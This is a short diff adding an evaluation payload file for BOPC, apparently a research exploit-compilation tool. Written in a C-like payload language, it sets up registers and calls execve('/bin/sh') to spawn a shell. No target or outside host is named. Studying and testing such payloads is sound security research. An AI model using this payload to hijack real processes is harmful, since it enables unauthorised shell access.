@@ -1,0 +1,18 @@
+// 
+// BOPC Evaluation
+//
+// execve('/bin/sh') payload
+//
+void payload() 
+{ 
+    string prog = "/bin/sh\0";
+    int argv    = {&prog, 0x0};
+
+    __r0 = &prog;
+    __r1 = &argv;
+    __r2 = 0;
+    
+    execve(__r0, __r1, __r2);
+
+    // return ?
+}
